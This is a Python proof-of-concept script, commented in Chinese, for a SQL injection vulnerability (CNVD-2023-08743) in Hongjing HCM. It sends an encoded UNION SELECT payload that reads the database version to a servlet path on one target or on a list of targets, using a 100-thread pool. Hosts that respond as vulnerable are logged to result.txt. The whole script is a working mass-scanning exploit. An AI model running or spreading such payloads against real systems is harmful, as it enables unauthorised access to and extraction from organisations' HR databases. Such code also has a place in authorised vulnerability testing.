import argparse
import sys
import requests
import time
import re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# 主函数，解析命令行参数并执行相应操作
def main():
    parser = argparse.ArgumentParser(description="宏景HCM SQL注入漏洞复现 (CNVD-2023-08743)")
    parser.add_argument('-u', '--url', help='Please input your attack url')
    parser.add_argument('-f', '--file', help='Please input your attack file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)  # 执行POC
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  # 定义线程
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  

# POC
def poc(target):
    url = target + '/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1'  ## 拼接漏洞存在的路径
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1'
    }

    try:
        res = requests.get(url, headers=headers, timeout=5, verify=False).text  # 发送get请求，并获取响应包
        if 'TreeNode id=' in res:  # 判断响应是否存在特定字符
            print(f"[+] 经检查 {target} 存在 SQL注入 漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")  # 存在漏洞的url写入文件
        else:
            print(f"[-] 经检查 {target} 不存在漏洞")
    except:
        print(f"[!] {target} server error")

# 主函数
if __name__ == '__main__':
    main()
